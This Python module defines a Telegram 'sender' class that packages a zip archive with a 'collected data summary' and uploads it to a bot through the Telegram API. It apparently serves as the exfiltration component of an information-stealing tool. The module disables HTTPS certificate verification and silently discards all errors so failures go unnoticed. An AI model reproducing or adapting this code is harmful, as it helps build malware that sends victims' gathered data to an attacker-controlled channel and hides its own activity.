from io import BytesIO
from typing import Tuple, Union
from urllib.request import Request, urlopen

from helper.abstract import AbstractSender


class Telegram(AbstractSender):
    """
    Sender for the Telegram.
    """
    def __init__(self, token: str, user_id: int):
        super().__init__()

        self.__token = token
        self.__user_id = user_id
        self.__url = f"https://api.telegram.org/bot{self.__token}/sendDocument"

    def __get_sender_data(self) -> Tuple[Union[str, bytes], ...]:
        """
        Gets data to send.

        Parameters:
        - None.

        Returns:
        - tuple: A tuple of content type, body, and Telegram api url.
        """
        content_type, body = self._encoder.encode(
            [("chat_id", self.__user_id), ("caption", self.__preview)],
            [("document", f"{self.__zip_name}.zip", self.__data)]
        )

        return content_type, body

    def __send_archive(self) -> None:
        """
        Sends the data.

        Parameters:
        - None.

        Returns:
        - None.
        """
        content_type, body = self.__get_sender_data()
        query = Request(method="POST", url=self.__url, data=body)

        query.add_header("User-Agent", self._config.UserAgent)
        query.add_header("Content-Type", content_type)

        urlopen(query)

    def run(self, zip_name: str, data: BytesIO, preview: str) -> None:
        """
        Launches the sender module.

        Parameters:
        - zip_name [str]: Archive name.
        - data [BytesIO]: BytesIO object.
        - preview [str]: Collected data summary.

        Returns:
        - None.
        """
        self.__zip_name = zip_name
        self.__data = data
        self.__preview = preview

        try:

            self._create_unverified_https()
            self.__send_archive()

        except Exception as e:
            pass
